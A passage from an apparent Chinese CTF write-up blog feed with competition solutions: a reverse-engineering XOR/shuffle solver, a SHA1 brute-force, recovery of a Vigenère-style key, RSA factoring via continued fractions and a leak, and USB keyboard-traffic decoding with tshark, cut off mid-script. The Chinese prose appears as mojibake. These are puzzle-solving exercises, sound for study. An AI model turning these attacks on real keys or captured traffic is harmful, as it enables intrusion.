class="hljs-number">0xD030B02</span>;<br>    v22 = <span class="hljs-number">0x5000901</span>;<br>    v23 = <span class="hljs-number">0xC080F04</span>;<br>    v24 = <span class="hljs-number">0x1F17181B</span>;<br>    v25 = <span class="hljs-number">0x13121E14</span>;<br>    v26 = <span class="hljs-number">0x1C161D15</span>;<br>    v27 = <span class="hljs-number">0x1A191011</span>;<br>    __asm &#123; vpshufb ymm0, ymm0, ymmword ptr [ebp<span class="hljs-number">-60</span>h] &#125;<br>    *(_DWORD *)v29 = <span class="hljs-number">0xE899915F</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">4</span>] = <span class="hljs-number">0x92B0D04E</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">8</span>] = <span class="hljs-number">0xF44F3CB1</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">12</span>] = <span class="hljs-number">0x12DA7617</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">16</span>] = <span class="hljs-number">0x1501352A</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">20</span>] = <span class="hljs-number">0x195E97F9</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">24</span>] = <span class="hljs-number">0x9915C29D</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">28</span>] = <span class="hljs-number">0xCC9F7D70</span>;<br>    __asm<br>    &#123;<br>        vpcmpeqb ymm0, ymm0, ymmword ptr [ebp<span class="hljs-number">-20</span>h]<br>            vmovdqu ymmword ptr [ebp<span class="hljs-number">-20</span>h], ymm0<br>            vzeroupper<br>        &#125;<br>    <span class="hljs-keyword">while</span> ( *(_DWORD *)v7 == *(_DWORD *)v8 )<br>    &#123;<br>        v7 += <span class="hljs-number">4</span>;<br>        v8 += <span class="hljs-number">4</span>;<br>        v14 = v9 &lt; <span class="hljs-number">4</span>;<br>        v9 -= <span class="hljs-number">4</span>;<br>        <span class="hljs-keyword">if</span> ( v14 )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰‹åŠ¨è¯†åˆ«sha1,ç„¶åæœ‰ä¸ªxor,ä¹±åº,æå–åè¿‡æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">msg = [<span class="hljs-number">0xCD</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x92</span>,<br>       <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x7D</span>,<br>       <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xE2</span>,<br>       <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x32</span>]<br>index_ = [<span class="hljs-number">0x0A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x09</span>,<br>          <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x1F</span>,<br>          <span class="hljs-number">0x14</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x10</span>,<br>          <span class="hljs-number">0x19</span>, <span class="hljs-number">0x1A</span>]<br>des = [<span class="hljs-number">0x5F</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x3C</span>,<br>       <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x15</span>,<br>       <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7D</span>,<br>       <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xCC</span>]<br>des2 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    des2.append(des[index_[i]])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> des2:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].upper(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>des3 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    des3.append(des[index_.index(i)])<br><br><span class="hljs-built_in">print</span>()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> des3:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].upper(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-built_in">print</span>()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    des3[i] ^= msg[i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> des3:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].upper(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">4F92B0DA99F4E876913C5FD04E12B117999D19CCF99F115977D5E70352AC215</span><br><span class="hljs-string">4FB14EB017F49991DA3C5FD01292E8767D705E19F99D151359FCC2A99C29715</span><br><span class="hljs-string">825A10C618D636A058AE633FAA539E70655FEB648697FF84A79F4589B5207027</span><br><span class="hljs-string"> &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œç¨‹åºï¼Œè¾“å…¥å­—ç¬¦ä¸²å°±å¯ä»¥æ‹¿åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">Input your code: 825A10C618D636A058AE633FAA539E70655FEB648697FF84A79F4589B5207027<br>Your Flag is: flagfISEC-a49d6b847bdba62c5bfa0a43b69c85753<br></code></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h4><p>çˆ†ç ´sha1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> string<br><br>sha1 = <span class="hljs-string">&quot;8c36e4?c1d294?df5bb7a9b?b8bd2d2?f22c1f?9&quot;</span><br>dic = string.printable<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br>            <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> dic:<br>                pw = <span class="hljs-string">f&#x27;i<span class="hljs-subst">&#123;i&#125;</span>Bgt<span class="hljs-subst">&#123;j&#125;</span>_Ld<span class="hljs-subst">&#123;k&#125;</span>s<span class="hljs-subst">&#123;l&#125;</span>6c9&#x27;</span><br>                sha11 = hashlib.sha1(pw.encode()).hexdigest()<br>                <span class="hljs-keyword">if</span> sha11[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == sha1[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]:<br>                    <span class="hljs-built_in">print</span>(pw, sha11)<br>                  <br><span class="hljs-comment"># idBgtV_Ld&#123;sE6c9 8c36e414229315b89bfb39279fb2591cf474a188</span><br><span class="hljs-comment"># ifBgtd_LdTs+6c9 8c36e41f5c5c73579aec0cfb5bd99436606768f1</span><br><span class="hljs-comment"># ihBgtc_LdUs&#123;6c9 8c36e46ea808b38b56c3a676c296226219243353</span><br><span class="hljs-comment"># ikBgtm_Ld*s46c9 8c36e4a43c55291fd0273356c7259c9fc99fc167</span><br><span class="hljs-comment"># ilBgt0_Ldzsp6c9 8c36e4eea79d01bdb59b9f15323e652a278eceb0</span><br><span class="hljs-comment"># ipBgt&lt;_Ld)sa6c9 8c36e4a7ca1e295fb174fe8b215d126a944d4f4d</span><br><span class="hljs-comment"># iZBgtZ_Ldqs;6c9 8c36e471073904d2ba3e3a66c80899893dbbe27d</span><br><span class="hljs-comment"># i&#123;Bgt)_Ldxs56c9 8c36e4637aad2cc5b043fa277efcefe3f35f280d</span><br><span class="hljs-comment"># i&#125;Bgt,_Ld9s96c9 8c36e4c30ba623f0c7c1bcdf6e9073cddb462cc6</span><br><span class="hljs-comment"># i~Bgto_Ldes     6c9 8c36e463691b8d473455e2914ff623f6e962c7ed</span><br><span class="hljs-comment"># i~BgtN_Ld@sw6c9 8c36e45c1d2949df5bb7a9bfb8bd2d24f22c1f49</span><br></code></pre></td></tr></table></figure><p>å‹ç¼©åŒ…çˆ†ç ´å¾—åˆ°ç¬¬äºŒå±‚å¯†ç ROT47</p><p>ç»“åˆå¯†ç å¯¹å¯†ç è§£ROT47å¾—åˆ°å¯†æ–‡</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-number">6</span>JnsNxHKJ8mkvhS&#123;<span class="hljs-keyword">rMO_c9apMfHDHObq80PMu</span>&#123;<span class="hljs-keyword">_ww_r</span>&#123;rq<br></code></pre></td></tr></table></figure><p>å˜è¡¨vigenereï¼Œå‚è€ƒ<a href="https://github.com/p4-team/ctf/tree/master/2017-12-09-seccon-quals/crypto_vigenere">ctf/2017-12-09-seccon-quals/crypto_vigenere at master Â· p4-team/ctf</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_l</span>(<span class="hljs-params">idx, s</span>):<br>    <span class="hljs-keyword">return</span> s[idx:] + s[:idx]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">p, k1, k2</span>):<br>    s = <span class="hljs-string">&quot;abcd07efghij89klmnopqr16stuvwxyz-_&#123;&#125;ABCDEFGHIJKL34MNOPQRST25VWXYZ&quot;</span><br>    t = [[_l((i+j) % <span class="hljs-built_in">len</span>(s), s) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))]<br>    i1 = <span class="hljs-number">0</span><br>    i2 = <span class="hljs-number">0</span><br>    c = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> p:<br>        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]<br>        i1 = (i1 + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(k1)<br>        i2 = (i2 + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(k2)<br>    <span class="hljs-keyword">return</span> c<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ct, k1, k2</span>):<br>    s = <span class="hljs-string">&quot;abcd07efghij89klmnopqr16stuvwxyz-_&#123;&#125;ABCDEFGHIJKL34MNOPQRST25VWXYZ&quot;</span><br>    t = [[_l((i + j) % <span class="hljs-built_in">len</span>(s), s) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))]<br>    i1 = <span class="hljs-number">0</span><br>    i2 = <span class="hljs-number">0</span><br>    decrypted = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> ct:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">if</span> t[s.find(c)][s.find(k1[i1])][s.find(k2[i2])] == a:<br>                decrypted += c<br>                <span class="hljs-keyword">break</span><br>        i1 = (i1 + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(k1)<br>        i2 = (i2 + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(k2)<br>    <span class="hljs-keyword">return</span> decrypted<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_key</span>(<span class="hljs-params">known_prefix, ciphertex</span>):<br>    final_key = [<span class="hljs-string">&#x27;*&#x27;</span>] * <span class="hljs-number">20</span><br>    s = <span class="hljs-string">&quot;abcd07efghij89klmnopqr16stuvwxyz-_&#123;&#125;ABCDEFGHIJKL34MNOPQRST25VWXYZ&quot;</span><br>    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>            partial_candidate_key = [<span class="hljs-string">&#x27;*&#x27;</span>] * <span class="hljs-number">20</span> <span class="hljs-comment"># ä¸º2çš„å€æ•°ï¼Œå¤šæ¬¡å°è¯•20å¾—åˆ°key</span><br>            partial_candidate_key[pos] = c<br>            partial_candidate_key[<span class="hljs-number">19</span> - pos] = c<br>            key = <span class="hljs-string">&quot;&quot;</span>.join(partial_candidate_key)<br>            res = encrypt(known_prefix, key, key[::-<span class="hljs-number">1</span>])<br>            <span class="hljs-keyword">if</span> res[pos] == ciphertex[pos]:<br>                final_key[pos] = c<br>                final_key[<span class="hljs-number">19</span> - pos] = c<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(final_key))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(final_key)<br><br>known = <span class="hljs-string">&#x27;flag&#123;ISEC-&#x27;</span><br>cipher = <span class="hljs-string">&#x27;6JnsNxHKJ8mkvhS&#123;rMO_c9apMfHDHObq80PMu&#123;_ww_r&#123;rq&#x27;</span><br>key = <span class="hljs-string">&quot;glFgFtudARRAdutFgFlg&quot;</span><br><br><span class="hljs-built_in">print</span>(recover_key(known,cipher))<br><span class="hljs-built_in">print</span>(decrypt(cipher,key[::-<span class="hljs-number">1</span>],key))<br></code></pre></td></tr></table></figure><h4 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">--/---/.-./..././..--.-/-.-./---/-.././..--.-/..-./..-/-./-./-.--<br>è§£æ‘©æ–¯è½¬å°å†™<br>morse_code_funny<br></code></pre></td></tr></table></figure><p>è¿åˆ†æ•°å±•å¼€å¾—åˆ°num1å’Œnum2ï¼Œç„¶åå¸¸è§„è§£rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># sage</span><br><br>data3 = <span class="hljs-number">1.23389923415003373900567515471436168841941584796842188964423737295914869304653496800649965063081353720701415762591488370228399019899893688681309320356016722276295236528757306976510687729729934668311830828756908988350841843676900575414367123810470585198055372776278588638204471298838884740198056387082949710435502826460830711429956</span><br><br>c = continued_fraction(data3)<br><br>alist = c.convergents()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> alist:<br>    a = <span class="hljs-built_in">str</span>(i).split(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)&gt;<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> gcd(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>])) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> is_prime(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">0</span>])) <span class="hljs-keyword">and</span> is_prime(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>])) <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a[<span class="hljs-number">0</span>]).bit_length()==<span class="hljs-number">512</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>]).bit_length()==<span class="hljs-number">512</span>:<br>        <span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-comment"># [&#x27;11167377337790397338811417806698264734026040696284907854286100186126887838302430726803014418419121360514985339992064951270502853852777225947659429837569693&#x27;, &#x27;9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517&#x27;]</span><br><br>n12=[<span class="hljs-number">11167377337790397338811417806698264734026040696284907854286100186126887838302430726803014418419121360514985339992064951270502853852777225947659429837569693</span>, <span class="hljs-number">9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517</span>]<br><br>leak = <span class="hljs-number">23213363443983005040318061737977092634638640953366787443691593387275645092922646169818923792205696350020369122807136306157118385984272980615310163206933078119776935167207473544453080959202803743994251355133953187110546017667004996272367137522351606700447920805532616096125523674597551449412004735397779511371</span><br><br>PHI = (n12[<span class="hljs-number">0</span>]-<span class="hljs-number">1</span>)*(n12[<span class="hljs-number">1</span>]-<span class="hljs-number">1</span>)<br>p_qd = <span class="hljs-built_in">pow</span>(n12[<span class="hljs-number">0</span>],-<span class="hljs-number">1</span>,PHI)<br>p_q = <span class="hljs-built_in">pow</span>(leak,p_qd,n12[<span class="hljs-number">0</span>]*n12[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(p_q)<br><br>var(<span class="hljs-string">&quot;p,q&quot;</span>)<br><br>ct = <span class="hljs-number">31011170589632318837149853165664224847925206003567781692767655474759523146503572164952138829336342836023903919700264739071138739105931471740973631326608186969523753119546323993892359278563753903149741128282349467136720827132122619177620866305659196267641453819504766216964516467658995724859657544518337771393</span><br>N = <span class="hljs-number">61860727516406742636690805639158184396057779906729165734489212939937929906456706343476469874085504076991779041906401043694401076841639925611957258119417559980829238154105119701407722069260962772947894516879731956778127512764229384957918619863998939985369399189275568362193066167855420897196095587732512368673</span><br><br>res = solve([N-p*q,p-q-p_q],[p,q],solution_dict=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-built_in">print</span>(res[<span class="hljs-number">0</span>][p])<br><span class="hljs-built_in">print</span>(res[<span class="hljs-number">0</span>][q])<br>p = res[<span class="hljs-number">0</span>][p]<br>q = res[<span class="hljs-number">0</span>][q]<br><br>d = <span class="hljs-built_in">pow</span>(<span class="hljs-number">65537</span>,-<span class="hljs-number">1</span>,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(ct,d,N)<br>mm = m - n12[<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(mm)[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€äº›USBæµé‡åˆ†æ</title>
    <link href="/2023/09/23/USB%E6%B5%81%E9%87%8F/"/>
    <url>/2023/09/23/USB%E6%B5%81%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<p>è¿™é‡Œè®°ä¸€ä¸‹ç¢°åˆ°çš„ä¸€äº›USBçš„æµé‡åˆ†æï¼‰</p><h2 id="2023-â€œåä¸ºæ¯â€ç¬¬äºŒå±Šä¸­å›½ç ”ç©¶ç”Ÿç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›"><a href="#2023-â€œåä¸ºæ¯â€ç¬¬äºŒå±Šä¸­å›½ç ”ç©¶ç”Ÿç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›" class="headerlink" title="2023 â€œåä¸ºæ¯â€ç¬¬äºŒå±Šä¸­å›½ç ”ç©¶ç”Ÿç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›"></a>2023 â€œåä¸ºæ¯â€ç¬¬äºŒå±Šä¸­å›½ç ”ç©¶ç”Ÿç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›</h2><h3 id="port"><a href="#port" class="headerlink" title="port"></a>port</h3><p>å¯¹usb.pcpangå¸¸è§„é”®ç›˜åˆ†æä¸€æ¡é¾™</p><p><code>tshark -r usb.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   a=f.readline().strip()<br>   <span class="hljs-keyword">if</span> a:<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)== <span class="hljs-number">16</span>: <span class="hljs-comment"># é¼ æ ‡æµé‡çš„è¯ len æ”¹ä¸º 8</span><br>          out=<span class="hljs-string">&#x27;&#x27;</span><br>          <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>              <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                  out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>              <span class="hljs-keyword">else</span>:<br>                 out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>          fi.write(out)<br>          fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>   <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">break</span><br>fi.close()<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, 